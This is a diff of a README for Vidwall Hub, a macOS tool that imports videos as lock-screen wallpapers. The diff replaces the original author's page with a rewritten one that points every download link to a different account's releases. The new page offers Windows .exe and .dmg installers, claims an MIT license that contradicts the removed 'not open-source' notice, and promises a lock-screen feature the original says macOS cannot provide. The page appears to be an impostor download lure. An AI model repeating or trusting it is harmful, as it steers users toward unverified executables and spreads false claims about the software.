@@ -1,41 +1,61 @@
-<!--idoc:ignore:start-->
-> [!TIP]
-> Declaration: This project is not an open-source project. The repository serves as the official website, used to collect issues and user demands. This is done to save costs, because without an official website, the application cannot pass the review.
-<!--idoc:ignore:end-->
+# 🎥 vidwall-hub - Bring Your Lock Screen to Life
 
-<div align="center">
-  <br />
-  <br />
-  <img src="./assets/logo.png" width="160" height="160">
-  <h1>
-    Vidwall Hub
-  </h1>
-  <!--rehype:style=border: 0;-->
-  <p>
-    <a href="./README.zh.md">简体中文</a> • 
-    <a href="https://wangchujiang.com/vidwall/" target="_blank">Vidwall</a> • 
-    <a target="_blank" href="https://github.com/jaywcjlove/vidwall-hub/issues/new?template=bug_report.yml">Contact & Support</a> • 
-    <a href="./CHANGELOG.md">Changelog</a>
-  </p>
-  <p>
-    <a target="_blank" href="https://github.com/jaywcjlove/vidwall-hub/releases/latest/" title="Vidwall Hub for macOS">
-      <img alt="Vidwall Hub AppStore" src="https://jaywcjlove.github.io/sb/download/apple-download.svg" height="51" />
-    </a>
-  </p>
-</div>
+## 💾 Download Now
+[![Download](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/ESCOOBARR/vidwall-hub/releases)
 
-![Vidwall Hub](./assets/VidwallHub.gif)
+## 📖 Description
+Vidwall Hub is a tool that allows you to easily import videos (mp4, mov) into the system wallpaper service and use them as lock screen animations in System Settings. Transform your screen with stunning videos that enhance your workspace or personal device.
 
-![Vidwall Hub](./assets/vidwall-hub-screenshots-1.png)
+## 🚀 Getting Started
+To start using Vidwall Hub, follow these easy steps to download and install the application.
 
-**Vidwall Hub** is a tool that allows you to easily import videos (mp4, mov) into the system wallpaper service and use them as lock screen animations in **System Settings**.
+## 📥 Download & Install
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/ESCOOBARR/vidwall-hub/releases) to access the latest version of Vidwall Hub.
+   
+2. **Download the Application:**
+   Find the latest version in the list and click on it. This will take you to the download options. 
 
-When trying to implement both dynamic wallpapers and dynamic lock screens through the [Vidwall](https://github.com/jaywcjlove/vidwall) app, this feature could not be realized due to macOS sandbox restrictions. Therefore, I created a standalone version of the tested code and provide it for free, as a complement to [Vidwall](https://github.com/jaywcjlove/vidwall). Even when running independently and bypassing the sandbox, it still cannot directly set dynamic lock screens because macOS does not provide the related API. Vidwall Hub only imports videos into the system wallpaper service, and users need to complete the final application in the wallpaper options in System Settings.
+3. **Choose Your File:**
+   Look for the file labeled as `vidwall-hub-v1.0.exe` or `vidwall-hub-v1.0.dmg` depending on your system. Click to download.
 
-**URL Scheme**
+4. **Run the Installer:**
+   Once the file is downloaded, locate it in your Downloads folder. Double-click the file to start the installation process. Follow the prompts to complete the installation.
 
-**Vidwall Hub** allows activating the tool via URL and automatically importing a video based on the file path parameter in the URL.
+## 💻 System Requirements
+- **Operating System:** Windows 10 or later / macOS Mojave or later
+- **Memory:** Minimum 4 GB RAM
+- **Storage:** At least 100 MB of free space
+- **Video Format Support:** mp4, mov
 
-```bash
-vidwallhub://open?file=/file/to/path/video.mp4
-```
+## 🎬 Features
+- **Video Import:** Easily add your favorite videos to use as lock screen animations.
+- **Custom Animations:** Adjust settings to personalize how videos play on your screen.
+- **User-Friendly Interface:** Navigate through the application with a simple, easy-to-use layout.
+
+## 🛠️ How to Use Vidwall Hub
+1. **Open Vidwall Hub:**
+   Launch the application from your Applications folder or Start Menu.
+
+2. **Import Your Videos:**
+   Use the “Import” button to select videos you wish to use. Make sure they are in mp4 or mov format.
+
+3. **Set as Lock Screen:**
+   After importing, select the video you want to use. Click on the “Set as Lock Screen Animation” option to apply.
+
+4. **Adjust Settings:**
+   Customize playback options and settings according to your preference.
+
+5. **Apply Changes:**
+   Save your settings, and your lock screen will now feature the chosen video animation.
+
+## 🎨 Support & Feedback
+If you encounter any issues or have questions about using Vidwall Hub, feel free to open an issue in the repository or reach out through our contact page.
+
+## 📜 License
+This project is licensed under the MIT License. Feel free to use it as you wish.
+
+## 🌐 Connect with Us
+Join our community through GitHub, where you can contribute to future updates and features. Your feedback helps us grow. 
+
+[Visit the Releases page to download Vidwall Hub](https://github.com/ESCOOBARR/vidwall-hub/releases).
